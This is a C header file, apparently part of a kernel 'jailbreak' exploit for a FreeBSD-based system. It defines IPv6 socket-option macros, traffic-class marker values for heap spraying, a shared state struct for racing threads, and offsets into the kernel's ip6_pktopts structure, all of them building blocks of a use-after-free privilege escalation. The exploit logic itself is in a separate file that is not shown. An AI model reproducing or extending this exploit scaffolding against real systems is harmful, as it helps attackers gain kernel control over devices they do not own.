//
// USED IN JAILBREAK.C
//
#pragma once
#ifndef _JAILBREAK_HH
#define _JAILBREAK_HH

#define new_socket() socket(AF_INET6, SOCK_DGRAM, 0)

#define IPV6_2292PKTINFO    19
#define IPV6_2292PKTOPTIONS 25

#define TCLASS_MASTER   0x13370000
#define TCLASS_MASTER_2 0x73310000
#define TCLASS_SPRAY    0x41
#define TCLASS_TAINT    0x42

#define set_pktopts(s, buf, len) setsockopt(s, IPPROTO_IPV6, IPV6_2292PKTOPTIONS, buf, len)
#define set_pktinfo(s, buf)      setsockopt(s, IPPROTO_IPV6, IPV6_PKTINFO, buf, sizeof(struct in6_pktinfo))
#define set_rthdr(s, buf, len)   setsockopt(s, IPPROTO_IPV6, IPV6_RTHDR, buf, len)
#define free_pktopts(s)          set_pktopts(s, NULL, 0)

struct opaque {
    volatile int triggered;
    volatile int padding;
    volatile int done1;
    volatile int done2;
    int master_sock; // master socket
    int kevent_sock; // kevent socket
    int* spray_sock; // pointer to array of sprayed sock's 
};

#define PKTOPTS_PKTINFO_OFFSET (offsetof(struct ip6_pktopts, ip6po_pktinfo))
#define PKTOPTS_RTHDR_OFFSET   (offsetof(struct ip6_pktopts, ip6po_rhinfo.ip6po_rhi_rthdr))
#define PKTOPTS_TCLASS_OFFSET  (offsetof(struct ip6_pktopts, ip6po_tclass))


#endif
